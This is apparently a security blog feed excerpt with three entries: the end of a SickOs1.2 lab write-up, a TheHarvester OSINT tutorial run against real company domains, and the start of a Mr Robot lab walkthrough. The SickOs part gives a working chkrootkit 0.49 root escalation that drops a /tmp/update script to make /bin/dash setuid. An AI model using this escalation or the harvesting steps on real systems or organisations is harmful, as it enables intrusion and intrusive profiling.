<p>The entry that got my attention was the chkrootkit one. chkrootkit is a tool that checks for rootkits on the system. I googled for possible exploits, and I did find <a href="https://www.exploit-db.com/exploits/33899/">one</a> right away. The vulnerable version is 0.49. I checked which version is installed on the system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ chkrootkit -V
</span><span class='line'>chkrootkit version 0.49</span></code></pre></td></tr></table></div></figure>


<p>Well, well! The exploit leverages exactly the case here, vulnerable chkrootkit running as root, courtesy of the cron job. The step to compromise the system is to put an executable file named &lsquo;update&rsquo; with non-root owner in /tmp</p>

<p>So, my idea was to give myself privileges to run an existing shell as root. I looked at what shells are installed on the system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /etc/shells
</span><span class='line'># /etc/shells: valid login shells
</span><span class='line'>/bin/sh
</span><span class='line'>/bin/dash
</span><span class='line'>/bin/bash
</span><span class='line'>/bin/rbash
</span><span class='line'>$ ls -l /bin/*sh
</span><span class='line'>-rwxr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash
</span><span class='line'>-rwxr-xr-x 1 root root 100284 Mar 29  2012 /bin/dash
</span><span class='line'>lrwxrwxrwx 1 root root      4 Mar 28  2013 /bin/rbash -&gt; bash
</span><span class='line'>lrwxrwxrwx 1 root root      4 Mar 29  2012 /bin/sh -&gt; dash
</span><span class='line'>lrwxrwxrwx 1 root root      7 Nov 16  2012 /bin/static-sh -&gt; busybox</span></code></pre></td></tr></table></div></figure>


<p>I wasted almost an hour next, because the non-interactive shell gave me grief and prevented things from working properly. I started with bash and made it suid and ran it, but it didn&rsquo;t work. What worked was making dash suid and also spawning a TTY shell with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</code>.</p>

<p>Inside the update file, I just made <em>/bin/dash</em> suid:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat update
</span><span class='line'>#!/bin/bash
</span><span class='line'>chmod u+s /bin/dash</span></code></pre></td></tr></table></div></figure>


<p>Then I waited a minute for cron to run and got root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ /bin/dash
</span><span class='line'>/bin/dash
</span><span class='line'># whoami
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Besides the flag, in the root directory there was rule file for iptables that explained the VM&rsquo;s behavior. Anyway, here&rsquo;s the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
</span><span class='line'>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
</span><span class='line'>WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.
</span><span class='line'>
</span><span class='line'>Thanks for giving this try.
</span><span class='line'>
</span><span class='line'>@vulnhub: Thanks for hosting this UP!.</span></code></pre></td></tr></table></div></figure>


<p>This machine was challenging in the way it limited you to only certain actions. Damn, the first thing I will do from now on when getting a limited shell is spawn a TTY!!!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Tomorrow will be cancelled due to lack \
</span><span class='line'>\ of interest.                           /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[TheHarvester - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/02/theharvester-kali-linux-tools/"/>
    <updated>2017-07-02T08:32:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/02/theharvester-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to perform OSINT recon on a target and aggregate information from different sources. TheHarvester is an e-mail, subdomain and people names harvester written in Python.</p>

<p>Homepage: <a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p>

<!-- more -->


<h2>theharvester description</h2>

<blockquote><p>theHarvester is a tool for gathering e-mail accounts, subdomain names, virtual
hosts, open ports/ banners, and employee names from different public sources
(search engines, pgp key servers).</p>

<p>Is a really simple tool, but very effective for the early stages of a penetration
test or just to know the visibility of your company in the Internet.</p>

<p>The sources are:</p>

<p>Passive:</p>

<p>-google: google search engine  &ndash; www.google.com</p>

<p>-googleCSE: google custom search engine</p>

<p>-google-profiles: google search engine, specific search for Google profiles</p>

<p>-bing: microsoft search engine  &ndash; www.bing.com</p>

<p>-bingapi: microsoft search engine, through the API (you need to add your Key in the discovery/bingsearch.py file)</p>

<p>-dogpile: Dogpile search engine &ndash; www.dogpile.com</p>

<p>-pgp: pgp key server &ndash; mit.edu</p>

<p>-linkedin: google search engine, specific search for Linkedin users</p>

<p>-vhost: Bing virtual hosts search</p>

<p>-twitter: twitter accounts related to an specific domain (uses google search)</p>

<p>-googleplus: users that works in target company (uses google search)</p>

<p>-yahoo: Yahoo search engine</p>

<p>-baidu: Baidu search engine</p>

<p>-shodan: Shodan Computer search engine, will search for ports and banner of the
discovered hosts  (<a href="http://www.shodanhq.com/">http://www.shodanhq.com/</a>)</p>

<p>Active:</p>

<p>-DNS brute force: this plugin will run a dictionary brute force enumeration</p>

<p>-DNS reverse lookup: reverse lookup of ip´s discovered in order to find hostnames</p>

<p>-DNS TDL expansion: TLD dictionary brute force enumeration</p>

<p>Modules that need API keys to work:</p>

<p>-googleCSE: You need to create a Google Custom Search engine(CSE), and add your
Google API key and CSE ID in the plugin (discovery/googleCSE.py)</p>

<p>-shodan: You need to provide your API key in discovery/shodansearch.py</p></blockquote>

<h2>theharvester options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>*******************************************************************
</span><span class='line'>*                                                                 *
</span><span class='line'>* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
</span><span class='line'>* | __| '_ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
</span><span class='line'>* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
</span><span class='line'>*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
</span><span class='line'>*                                                                 *
</span><span class='line'>* TheHarvester Ver. 2.7                                           *
</span><span class='line'>* Coded by Christian Martorella                                   *
</span><span class='line'>* Edge-Security Research                                          *
</span><span class='line'>* cmartorella@edge-security.com                                   *
</span><span class='line'>*******************************************************************
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Usage: theharvester options 
</span><span class='line'>
</span><span class='line'>       -d: Domain to search or company name
</span><span class='line'>       -b: data source: google, googleCSE, bing, bingapi, pgp, linkedin,
</span><span class='line'>                        google-profiles, jigsaw, twitter, googleplus, all
</span><span class='line'>
</span><span class='line'>       -s: Start in result number X (default: 0)
</span><span class='line'>       -v: Verify host name via dns resolution and search for virtual hosts
</span><span class='line'>       -f: Save the results into an HTML and XML file (both)
</span><span class='line'>       -n: Perform a DNS reverse query on all ranges discovered
</span><span class='line'>       -c: Perform a DNS brute force for the domain name
</span><span class='line'>       -t: Perform a DNS TLD expansion discovery
</span><span class='line'>       -e: Use this DNS server
</span><span class='line'>       -l: Limit the number of results to work with(bing goes from 50 to 50 results,
</span><span class='line'>            google 100 to 100, and pgp doesn't use this option)
</span><span class='line'>       -h: use SHODAN database to query discovered hosts
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>        theharvester -d microsoft.com -l 500 -b google -h myresults.html
</span><span class='line'>        theharvester -d microsoft.com -b pgp
</span><span class='line'>        theharvester -d microsoft -l 200 -b linkedin
</span><span class='line'>        theharvester -d apple.com -b googleCSE -l 500 -s 300</span></code></pre></td></tr></table></div></figure>


<h2>theharvester usage</h2>

<ul>
<li>search with all options for a given domain</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>theharvester -d hackerone.com -l 200 -b all -f harvested
</span><span class='line'>
</span><span class='line'>*******************************************************************
</span><span class='line'>*                                                                 *
</span><span class='line'>* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
</span><span class='line'>* | __| '_ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
</span><span class='line'>* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
</span><span class='line'>*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
</span><span class='line'>*                                                                 *
</span><span class='line'>* TheHarvester Ver. 2.7                                           *
</span><span class='line'>* Coded by Christian Martorella                                   *
</span><span class='line'>* Edge-Security Research                                          *
</span><span class='line'>* cmartorella@edge-security.com                                   *
</span><span class='line'>*******************************************************************
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Full harvest..
</span><span class='line'>[-] Searching in Google..
</span><span class='line'>  Searching 0 results...
</span><span class='line'>  Searching 100 results...
</span><span class='line'>  Searching 200 results...
</span><span class='line'>[-] Searching in PGP Key server..
</span><span class='line'>[-] Searching in Bing..
</span><span class='line'>  Searching 50 results...
</span><span class='line'>  Searching 100 results...
</span><span class='line'>  Searching 150 results...
</span><span class='line'>  Searching 200 results...
</span><span class='line'>[-] Searching in Exalead..
</span><span class='line'>  Searching 50 results...
</span><span class='line'>  Searching 100 results...
</span><span class='line'>  Searching 150 results...
</span><span class='line'>  Searching 200 results...
</span><span class='line'>  Searching 250 results...
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[+] Emails found:
</span><span class='line'>------------------
</span><span class='line'>feedback@hackerone.com
</span><span class='line'>support@hackerone.com
</span><span class='line'>[REDACTED}
</span><span class='line'>
</span><span class='line'>[+] Hosts found in search engines:
</span><span class='line'>------------------------------------
</span><span class='line'>[-] Resolving hostnames IPs... 
</span><span class='line'>162.159.0.31:a.ns.hackerone.com
</span><span class='line'>104.16.13.26:support.hackerone.com
</span><span class='line'>104.16.99.52:www.hackerone.com
</span><span class='line'>[+] Virtual hosts:
</span><span class='line'>==================
</span><span class='line'>104.16.13.26  support.hackerone
</span><span class='line'>104.16.13.26  support.hackerone.com
</span><span class='line'>104.16.99.52  hackerone
</span><span class='line'>[+] Saving files...
</span><span class='line'>Files saved!</span></code></pre></td></tr></table></div></figure>


<p>Keep in mind that I&rsquo;m editing some results from the output for privacy reasons. I&rsquo;m also saving all results in HTML</p>

<ul>
<li>Linkedin enumeration</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>theharvester -d cisco.com -b linkedin -l 100 -f cisco
</span><span class='line'>
</span><span class='line'>*******************************************************************
</span><span class='line'>*                                                                 *
</span><span class='line'>* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
</span><span class='line'>* | __| '_ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
</span><span class='line'>* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
</span><span class='line'>*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
</span><span class='line'>*                                                                 *
</span><span class='line'>* TheHarvester Ver. 2.7                                           *
</span><span class='line'>* Coded by Christian Martorella                                   *
</span><span class='line'>* Edge-Security Research                                          *
</span><span class='line'>* cmartorella@edge-security.com                                   *
</span><span class='line'>*******************************************************************
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[-] Searching in Linkedin..
</span><span class='line'>  Searching 100 results..
</span><span class='line'>Users from Linkedin:
</span><span class='line'>====================
</span><span class='line'>Name
</span><span class='line'>Another name
</span><span class='line'>Names 
</span><span class='line'>Names everywhere</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Twitter enumeration</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>theharvester -d chousensha.github.io -l 10 -b twitter
</span><span class='line'>
</span><span class='line'>*******************************************************************
</span><span class='line'>*                                                                 *
</span><span class='line'>* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
</span><span class='line'>* | __| '_ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
</span><span class='line'>* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
</span><span class='line'>*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
</span><span class='line'>*                                                                 *
</span><span class='line'>* TheHarvester Ver. 2.7                                           *
</span><span class='line'>* Coded by Christian Martorella                                   *
</span><span class='line'>* Edge-Security Research                                          *
</span><span class='line'>* cmartorella@edge-security.com                                   *
</span><span class='line'>*******************************************************************
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[-] Searching in Twitter ..
</span><span class='line'>  Searching 100 results..
</span><span class='line'>Users from Twitter:
</span><span class='line'>====================
</span><span class='line'>@-moz-keyframes gb__a
</span><span class='line'>@keyframes gb__a
</span><span class='line'>@-moz-keyframes gb__nb
</span><span class='line'>@keyframes gb__nb
</span><span class='line'>@media 
</span><span class='line'>@keyframes qli-container-rotate 
</span><span class='line'>@keyframes qli-fill-unfill-rotate 
</span><span class='line'>@keyframes qli-blue-fade-in-out 
</span><span class='line'>@keyframes qli-red-fade-in-out 
</span><span class='line'>@keyframes qli-yellow-fade-in-out 
</span><span class='line'>@keyframes qli-green-fade-in-out 
</span><span class='line'>@keyframes qli-left-spin 
</span><span class='line'>@keyframes qli-right-spin 
</span><span class='line'>@kalilinux load balancer detector ...
</span><span class='line'>@chous3nsha
</span><span class='line'>@</span></code></pre></td></tr></table></div></figure>


<ul>
<li>sample HTML output</li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/tools/harvester.png" title="theharvester" alt="theharvester HTML report"></p>

<p>Also note that doing a reverse query on the discovered ranges takes long and the output might be overwhelming.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ In India, "cold weather" is merely a    \
</span><span class='line'>| conventional phrase and has come into   |
</span><span class='line'>| use through the necessity of having     |
</span><span class='line'>| some way to distinguish between weather |
</span><span class='line'>| which will melt a brass door-knob and   |
</span><span class='line'>| weather which will only make it mushy.  |
</span><span class='line'>|                                         |
</span><span class='line'>\ -- Mark Twain                           /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Owning Mr Robot]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/01/owning-mr-robot/"/>
    <updated>2017-07-01T04:46:24-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/01/owning-mr-robot</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target was inspired by the Mr Robot series. The goal is to find 3 hidden flags.</p>

<!-- more -->


<p>I used Masscan to grab the open ports, which I then passed to Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>masscan -p1-65535 --banners 192.168.217.145 --rate=10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-07-01 08:49:44 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning 1 hosts [65535 ports/host]
</span><span class='line'>Discovered open port 443/tcp on 192.168.217.145                                
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.145     
</span><span class='line'>
</span><span class='line'>nmap -T4 -p80,443 -A 192.168.217.145
</span><span class='line'>PORT    STATE SERVICE  VERSION
</span><span class='line'>80/tcp  open  http     Apache httpd
</span><span class='line'>|_http-server-header: Apache
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>443/tcp open  ssl/http Apache httpd
</span><span class='line'>|_http-server-header: Apache
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>| ssl-cert: Subject: commonName=www.example.com
</span><span class='line'>| Not valid before: 2015-09-16T10:45:03
</span><span class='line'>|_Not valid after:  2025-09-13T10:45:03</span></code></pre></td></tr></table></div></figure>


<p>Just a web server. However, this doesn&rsquo;t look like your regular web app:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/fsociety.png" title="fsociety" alt="fsociety login"></p>

<p>Interesting, we are in contact with fsociety! I ran each command (type help to see them listed at any time), and here&rsquo;s what we have so far:</p>

<ul>
<li><p>prepare &ndash; a video that ends with an address that warrants checking: whoismrrobot.com</p></li>
<li><p>fsociety &ndash; a CLI animation that asks if you are ready to join</p></li>
<li><p>inform &ndash; a series of news that reveal the hypocrisy of today&rsquo;s (is it really made up?) society</p></li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/deflated.png" title="sports scandal" alt="sports scandal"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/space.png" title="space rocket" alt="space rocket"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/meast.png" title="middle east" alt="middle east"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/gala.png" title="gala" alt="celebrity gala"></p>

<ul>
<li>question &ndash; more pictures with hard to accept truths</li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/america.png" title="patriot" alt="american dream"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/executive.png" title="executive" alt="executive stealing"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/capitalist.png" title="capitalism" alt="capitalism"></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/bzns.png" title="business" alt="business"></p>

<ul>
<li><p>wakeup &ndash; shows some high level executives arguing in a skyscraper</p></li>
<li><p>join &ndash; fsociety requests your mail address to keep in touch</p></li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/mail.png" title="enter your mail" alt="enter your mail"></p>

<p>Alright, we had some fun. Now I checked that URL I mentioned earlier for more breadcrumbs:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/whois.png" title="whois mr robot" alt="whois mr robot"></p>

<p>You can click on the GUI, look around, play some games. There are also some commands you can run in the terminal:</p>

<ul>
<li><p>fsociety_endgame &ndash; launches a game that you might want to discover for yourself</p></li>
<li><p>massacre &ndash; launches a movie, but I got a message that content is not available to my location</p></li>
<li><p>elliot &ndash; shows a GIF</p></li>
<li><p>fivenine &ndash; looks like a collection of clips related to the Five-Nine attack</p></li>
<li><p>restart &ndash; another scene from the series</p></li>
<li><p>join &ndash; get in touch with Mr Robot</p></li>
<li><p>archive &ndash; shows some of the above commands</p></li>
</ul>


<h2>Flag #1</h2>

<p>When running the commands, you probably noticed that the web path changes to <code>URL/cmdname</code>. I looked for robots.txt, and it looks like Mr Robot isn&rsquo;t the only robot around:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>fsocity.dic
</span><span class='line'>key-1-of-3.txt</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve found the first flag: <code>073403c8a58a1f80d943455fb30724b9</code></p>

<p>The other things looks like a dictionary file with various strings. Maybe it will come in handy later.</p>

<p>Continuing the web recon, I decided to use a tool that I haven&rsquo;t used before: uniscan!</p>

<h3>uniscan description</h3>

<p>Homepage: <a href="https://sourceforge.net/projects/uniscan/">https://sourceforge.net/projects/uniscan/</a></p>

<blockquote><p>Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p></blockquote>

<p>This tool comes in both CLI and GUI form. The GUI interface is plain and simple:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/uniscan-gui.png" title="uniscan-gui" alt="uniscan gui"></p>

<h3>uniscan options</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>####################################
</span><span class='line'># Uniscan project                  #
</span><span class='line'># http://uniscan.sourceforge.net/  #
</span><span class='line'>####################################
</span><span class='line'>V. 6.3
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>  -h  help
</span><span class='line'>  -u  &lt;url&gt; example: https://www.example.com/
</span><span class='line'>  -f  &lt;file&gt; list of url's
</span><span class='line'>  -b  Uniscan go to background
</span><span class='line'>  -q  Enable Directory checks
</span><span class='line'>  -w  Enable File checks
</span><span class='line'>  -e  Enable robots.txt and sitemap.xml check
</span><span class='line'>  -d  Enable Dynamic checks
</span><span class='line'>  -s  Enable Static checks
</span><span class='line'>  -r  Enable Stress checks
</span><span class='line'>  -i  &lt;dork&gt; Bing search
</span><span class='line'>  -o  &lt;dork&gt; Google search
</span><span class='line'>  -g  Web fingerprint
</span><span class='line'>  -j  Server fingerprint
</span><span class='line'>
</span><span class='line'>usage: 
</span><span class='line'>[1] perl ./uniscan.pl -u http://www.example.com/ -qweds
</span><span class='line'>[2] perl ./uniscan.pl -f sites.txt -bqweds
</span><span class='line'>[3] perl ./uniscan.pl -i uniscan
</span><span class='line'>[4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
</span><span class='line'>[5] perl ./uniscan.pl -o "inurl:test"
</span><span class='line'>[6] perl ./uniscan.pl -u https://www.example.com/ -r</span></code></pre></td></tr></table></div></figure>


